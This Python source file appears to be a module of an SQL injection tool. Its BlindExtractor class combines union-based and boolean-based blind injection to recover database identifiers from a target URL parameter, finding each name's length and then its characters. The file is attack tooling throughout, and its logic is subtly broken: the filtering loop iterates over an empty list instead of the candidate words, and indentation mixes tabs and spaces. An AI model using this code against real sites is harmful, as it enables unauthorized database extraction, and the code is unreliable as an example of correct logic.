from core.Requester import Requester
from core.Analyzer import Analyzer
from injections.BooleanInjector import BooleanInjector
from injections.ErrorInjector import ErrorInjector
from injections.UnionInjector import UnionInjector
from injections.TimeInjector import TimeInjector
from utils.Logger import Logger
from utils.constants import HEIGH_NAME_LENGTH, RESET, YELLOW, InjectionContext
from re import findall

class BlindExtractor:
	def __init__(self,
			# requester: Requester, analyzer: Analyzer,
			boolean: BooleanInjector,
   			union: UnionInjector,
		):
		# self.requester = requester
		# self.analyzer = analyzer
		self.boolean = boolean
		self.union = union

	def find_words(
     	self, body: str, start: str, end: str, length: int
    ) -> list[str]:
		pattern = rf"\b{start}\w{{{length - 2}}}{end}\b"
		return findall(pattern, body)

	def find_expressions_name(
		self, url: str, param: str, ctx: InjectionContext,
  		column_count: int, expression: str, union_expression: str
    ) -> str:
		# Test if we can get the expression's name included in the injection's response body
		body_containing_name = self.union.test_expressions_name(
      		url, param, ctx, union_expression, column_count
        )

		# Get the expression's name length
		name_length_expression = f"LENGTH({expression})"
		name_length = self.boolean.get_number_returned_by_sql(
      		url, param, ctx, name_length_expression, HEIGH_NAME_LENGTH
        )
		Logger.success(f"Found expression's name length: {YELLOW}{name_length}{RESET}")

		# Better simply compute for each character if length is short
		if name_length < 5:
			return self.boolean.get_expressions_name(url, param, ctx, expression, name_length)

		if body_containing_name:
			# Find the first and the last character in the expression's name
			first_last_chars = self.boolean.get_expressions_name_chars_at_index(
				url, param, ctx, expression, [1, name_length]
			)
			Logger.debug(f"First char: {first_last_chars[0]}, last char: {first_last_chars[1]}")

			# Look for words in the response body that has the right length and first/last char
			words = self.find_words(
       			body_containing_name, first_last_chars[0], first_last_chars[1], name_length
          	)

			if words:
				Logger.debug(
					f"Found words in the body with the right length and starting/ending characters:\n{words}\n"
				)
    
				# If we only have one result we return it
				length = len(words)
				if length == 1:
					return words[0]

				elif length > 1:
					corresponding_names: list[str] = []

					second_and_one_before_last_chars = self.boolean.get_expressions_name_chars_at_index(
						url, param, ctx, expression, [2, name_length - 1]
					)
					Logger.debug(
						f"Second char: {second_and_one_before_last_chars[0]}, "
						f"one before last char: {second_and_one_before_last_chars[1]}"
					)

					for name in corresponding_names:
						if (name[1] == second_and_one_before_last_chars[0]
							and name[name_length - 2] == second_and_one_before_last_chars[1]):
							corresponding_names.append(name)
	
					# If we only have one result we return it
					if len(corresponding_names) == 1:
						return corresponding_names[0]
					# Compute each character to find out the whole name

		return self.boolean.get_expressions_name(url, param, ctx, expression, name_length)
		